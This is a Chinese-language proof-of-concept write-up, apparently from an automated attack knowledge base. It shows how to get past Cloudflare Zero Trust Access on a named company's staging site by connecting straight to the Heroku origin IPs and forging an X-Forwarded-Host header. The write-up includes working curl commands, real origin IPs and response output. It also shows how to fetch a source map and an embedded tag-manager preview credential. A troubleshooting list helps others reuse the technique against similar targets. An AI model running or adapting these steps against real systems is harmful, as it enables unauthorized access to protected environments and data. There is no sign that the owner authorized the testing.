# fanatical.com apistaging2/staging2：Heroku 源站直连 + X-Forwarded-Host 伪造绕过 Cloudflare Access 与应用层 Host 守卫，零凭据读取预发布数据面/源码 map/GTM 预览凭据

- **code**: fanatical-apistaging2-xfh-hostguard-bypass-dataplane
- **kind**: poc
- **category**: auth-bypass
- **component**: Cloudflare Zero Trust Access + Heroku（fan-api-staging-2）+ Fanatical staging2 API/SPA
- **versions**: staging2 预发布环境（2026-11 观察）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: finding_id=115（task#5，finding_checks.verdict=verified），2026-11-11 17:00-17:05 UTC 本机 Git Bash + curl（UA=$ARTEX_UA，全部 --noproxy '*'）实测：① 基线经 Cloudflare 访问 https://apistaging2.fanatical.com/api/all/en → HTTP/2 302，location 跳 https://fanatical.cloudflareaccess.com/cdn-cgi/access/login/apistaging2.fanatical.com?...&redirect_url=%2Fapi%2Fall%2Fen，server: cloudflare / cf-ray 存在；② 直连 Heroku GA 35.71.177.79（--resolve）同一请求 → HTTP/2 403，server: Heroku，via: 2.0 heroku-router，body {"error":"403: Forbidden","message":"The api must be accessed through https://staging2.fanatical.com/api"}，证明已越过 CF 边缘但被应用层 Host 守卫拒绝；③ 同一请求仅加 X-Forwarded-Host: staging2.fanatical.com → HTTP/2 200，content-type application/json，content-length 141154，body 为 staging2 完整数据面 JSON（pickandmix/trustpilot/images 等）；④ /api/all/de 同法 → 200，140838 字节；⑤ 直连 staging2.fanatical.com（Host: staging2.fanatical.com，同一 GA IP）→ 200，88878 字节 SPA；GET /static/js/main~7aeafcb2.a08dcb65.js.map → 200，643301 字节；⑥ 页面内嵌 GTM 预览凭据可拉取 https://www.googletagmanager.com/gtm.js?id=GTM-KX5XG73&...&gtm_preview=env-448 → 200，591968 字节，含 GTM-KX5XG73、103 个 tag_id、UA-380147-32。边界：/api/user/* 仍 401，仅预发布数据面/构建产物/GTM 预览凭据外泄，未取得用户 PII。证据文件：/opt/artex/data/tasks/5/i1479/evidence_staging2.txt。
- **path**: pocs/fanatical-apistaging2-xfh-hostguard-bypass-dataplane/poc.md
- **tags**: cloudflare-access, cloudflare-zero-trust, heroku, herokudns, origin-direct, x-forwarded-host, host-header-bypass, host-guard-bypass, staging, fanatical, source-map, gtm-preview, credential-leak, noproxy
- **created_at**: 2026-11-11T17:09:49.160Z
- **engine**: https://apistaging2.fanatical.com / https://staging2.fanatical.com（Heroku 源站 app fan-api-staging-2，GA 35.71.177.79 等）
- **found_by**: exploit

## 描述

原理：staging2 的 API 主机 apistaging2.fanatical.com 与 Web 主机 staging2.fanatical.com 由同一个 Heroku 应用 fan-api-staging-2 提供。CF Zero Trust Access 只保护边缘；直连 Heroku GA 源站 IP 可摘掉 CF Access，但应用层 Host 守卫会按请求主机名拒绝，并回显唯一允许的 Host（https://staging2.fanatical.com/api）。该守卫信任 Heroku 注入/透传的 X-Forwarded-Host，伪造为允许值后即 200 返回预发布数据面。前提：目标 DNS 为 <app>.herokudns.com、可直连 443、curl 必须 --noproxy '*'。影响面：staging2 完整数据面 JSON（en/de）、SPA、前端 source map 与页面内嵌 GTM 预览凭据；应用自身用户接口仍 401，未取得 PII。

## 用法

```
三步最小复现（全部 --noproxy '*'，GA IP 用 nslookup 现取）：
1) nslookup -type=A apistaging2.fanatical.com.herokudns.com 1.1.1.1   # 拿 Heroku GA 源站 IP（会变）
2) 基线：curl -sk -D - https://apistaging2.fanatical.com/api/all/en    # 期望 302 -> fanatical.cloudflareaccess.com/.../access/login/apistaging2.fanatical.com
3) 直连源站：curl -sk --noproxy '*' -D - --resolve apistaging2.fanatical.com:443:<GA_IP> https://apistaging2.fanatical.com/api/all/en
   # 期望 403，Server: Heroku，body 给出允许值：The api must be accessed through https://staging2.fanatical.com/api
4) 加 X-Forwarded-Host 绕过守卫：同 3) 再加 -H 'X-Forwarded-Host: staging2.fanatical.com'
   # 期望 200 application/json 141154 字节（/api/all/en）；/api/all/de 200 140838
5) 同法直连 Web 主机：--resolve staging2.fanatical.com:443:<GA_IP> https://staging2.fanatical.com/ → 200 88878；/static/js/main~7aeafcb2.a08dcb65.js.map → 200 643301
6) GTM 预览：curl 'https://www.googletagmanager.com/gtm.js?id=GTM-KX5XG73&gtm_auth=<REDACTED&gt;&gtm_preview=env-448' -o gtm.js  # 200 591968，可枚举容器全部 tag
判据：同一路径「无 XFH=403 + 有 XFH=200 JSON」即为绕过成立；Server: Heroku、无 cf-ray 佐证直连源站。失败常见原因：未 --noproxy（代理重解析 DNS，回到 CF）；GA IP 漂移；XFH 值必须与 403 报文里给出的允许主机完全一致；应用未启用 trust proxy / 守卫只比对 Host 时不成立。边界：/api/user/* 仍 401，本手法只摘边缘门与 Host 守卫，不等于拿到应用鉴权。
```

## 正文

```
# Heroku 源站直连 + X-Forwarded-Host 绕过应用层 Host 守卫（Fanatical staging2 预发布数据面）

## 0. 结论与适用面

- 目标结构：`apistaging2.fanatical.com`（API）与 `staging2.fanatical.com`（SPA）由同一个 Heroku 应用 `fan-api-staging-2` 提供。
- 边缘：Cloudflare Zero Trust Access（经 CF 访问 API 一律 302 到 `fanatical.cloudflareaccess.com`）。
- 源站：Heroku 多租户路由，按 Host 头分发；直连 Heroku GA IP 即可摘掉 Cloudflare 边缘。
- 应用层：源站应用有 Host 守卫，只接受 `https://staging2.fanatical.com/api`，否则 403。
- 关键：该守卫信任 `X-Forwarded-Host`，伪造为允许值后可零凭据读取 staging2 完整数据面。

适用同类目标：Cloudflare Access 前置 + Heroku 托管；API 主机与 Web 主机分离但同属一个 Heroku app；应用层 Host 守卫从 `X-Forwarded-Host` 取 hostname。

> 注意：这是 kb 509（Heroku 源站直连绕 CF Access）的**补丁式扩展**。对 apistaging2，仅用 `Host: apistaging2...` 直连会 403；必须再加 `X-Forwarded-Host: staging2.fanatical.com`。

## 1. 前置条件

- 能直连公网 443。
- 本机有 HTTP 代理时必须 `--noproxy '*'`（否则代理自行解析 DNS，`--resolve` 失效，请求又回 Cloudflare）。
- 已知目标自定义域（`apistaging2.fanatical.com` / `staging2.fanatical.com`）与 Heroku GA 源站 IP。
- 无需任何账号、Cookie、CF Access 会话。

## 2. 复现步骤（2026-11-11 实测）

### 2.1 取 Heroku 源站 IP

```bash
nslookup -type=A apistaging2.fanatical.com.herokudns.com 1.1.1.1
# 本次观测到 4 个 GA IP：
#   13.248.162.64 / 166.117.94.78 / 35.71.177.79 / 99.83.176.110
# IP 会漂移，每次重新解析
```

### 2.2 基线：经 Cloudflare 被 Access 拦截

```bash
curl -sk -D - --max-time 20 https://apistaging2.fanatical.com/api/all/en
# HTTP/2 302
# location: https://fanatical.cloudflareaccess.com/cdn-cgi/access/login/apistaging2.fanatical.com?...&redirect_url=%2Fapi%2Fall%2Fen
# server: cloudflare
# cf-ray: <有>
```

### 2.3 直连 Heroku 源站：越过 CF，但被应用层 Host 守卫拒绝

```bash
curl -sk --noproxy '*' -D - --max-time 25 \
  --resolve apistaging2.fanatical.com:443:35.71.177.79 \
  https://apistaging2.fanatical.com/api/all/en
# HTTP/2 403
# server: Heroku
# via: 2.0 heroku-router
# {"error":"403: Forbidden","message":"The api must be accessed through https://staging2.fanatical.com/api"}
```

403 报文本身给出了守卫允许的 Host：`staging2.fanatical.com`。

### 2.4 加 X-Forwarded-Host：绕过守卫，读到数据面（主判定）

```bash
curl -sk --noproxy '*' -D - --max-time 25 \
  --resolve apistaging2.fanatical.com:443:35.71.177.79 \
  -H 'X-Forwarded-Host: staging2.fanatical.com' \
  https://apistaging2.fanatical.com/api/all/en
# HTTP/2 200
# content-type: application/json
# content-length: 141154
# body: {"pickandmix":[],"trustpilot":{"total":84770,"score":{"stars":4.5,"trustScore":4.7}},"images":[{"_id":"6ace53dc095e115ae..."},...
```

### 2.5 非单点：其它 locale 同样成立

```bash
curl -sk --noproxy '*' -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' \
  --resolve apistaging2.fanatical.com:443:35.71.177.79 \
  -H 'X-Forwarded-Host: staging2.fanatical.com' \
  https://apistaging2.fanatical.com/api/all/de
# 200 140838 application/json
```

### 2.6 同法直连 staging2 Web 主机：SPA + source map

```bash
curl -sk --noproxy '*' -o staging2.html -w '%{http_code} %{size_download}\n' \
  --resolve staging2.fanatical.com:443:35.71.177.79 \
  https://staging2.fanatical.com/
# 200 88878

curl -sk --noproxy '*' -o staging2-main.map -w '%{http_code} %{size_download} %{content_type}\n' \
  --resolve staging2.fanatical.com:443:35.71.177.79 \
  https://staging2.fanatical.com/static/js/main~7aeafcb2.a08dcb65.js.map
# 200 643301 application/json
```

source map 可还原 staging2 前端全部 API 调用与构建产物。

### 2.7 页面内嵌 GTM 预览凭据 → 拉取预发布容器配置

staging2 页面中内嵌 GTM 预览参数（`gtm_auth` 为凭据，值已脱敏，原文见证据文件；`gtm_preview=env-448`）：

```bash
curl -s -o gtm.js -w '%{http_code} %{size_download}\n' \
  'https://www.googletagmanager.com/gtm.js?id=GTM-KX5XG73&gtm_auth=<REDACTED>&gtm_preview=env-448'
# 200 591968
grep -o 'GTM-[A-Z0-9]*' gtm.js | sort -u          # GTM-KX5XG73
grep -o '"tag_id":"[0-9]*"' gtm.js | wc -l        # 103
grep -o 'UA-[0-9-]*' gtm.js | sort -u             # UA-380147-32
```

非预期者可借此读取预发布 GTM 容器全部 tag 配置（含第三方脚本、衡量 ID 等）。

## 3. 判据

- **边缘存在**：经 Cloudflare 正常访问 → 302 到 `<team>.cloudflareaccess.com/cdn-cgi/access/login/<host>`，且响应有 `server: cloudflare` / `cf-ray`。
- **已到源站**：直连 IP 的响应 `server: Heroku` / `via: 2.0 heroku-router`，无 `cf-ray`。
- **Host 守卫存在**：403 body 明确写出应使用的 host（本例 `https://staging2.fanatical.com/api`）。
- **绕过成立**：同一路径仅增加 `X-Forwarded-Host: <该 host>` → 200 且返回真实业务 JSON/HTML；`/api/all/en` 与 `/api/all/de` 均可复现。
- **边界**：`/api/user/*` 仍 401，说明应用自身用户鉴权未被绕过，影响限于预发布数据面/构建产物/GTM 预览凭据。

## 4. 失败常见原因

1. **走了本机/系统代理**：代理重解析 DNS，`--resolve` 不生效，请求又回到 Cloudflare（表现为 302 到 cloudflareaccess.com）。必须 `--noproxy '*'`，或换干净出口。
2. **Heroku GA IP 漂移**：每次用 `nslookup -type=A <host>.herokudns.com` 重新取，逐个 IP 试。
3. **X-Forwarded-Host 值不对**：必须与 403 报文中给出的允许主机完全一致（只写 hostname，不要带 scheme/path）。也可尝试 web 主机的裸域名。
4. **应用未启用 trust proxy**：如果 `X-Forwarded-Host` 被忽略或仍 403，说明守卫只比对原始 `Host` 或代理层未透传该头，本手法不成立。
5. **Cloudflare 已改为只回源 / Authenticated Origin Pulls**：直连会被拒，边缘绕过不成立。
6. **误把“直连 200 静态页”当突破**：SPA history fallback 可能对任意路径返回 200，需用 API JSON 或 source map 的字节数/内容做判据。

## 5. 关联条目

- kb 509 `heroku-origin-direct-bypass-cloudflare-access-host-header`：同族母技巧（herokudns → GA IP → Host 头直达 admin/staging/prelive/testing）。本条目补充的是其未覆盖的应用层 Host 守卫绕过：对 apistaging2 仅用 Host 头会 403，需 `X-Forwarded-Host`。
- kb 506：Fanatical React source map 未授权公开（同类构建产物泄露）。
- kb 94：TLS 证书 CN 反查非 CDN 子域 → 源站 IP 泄露。
```
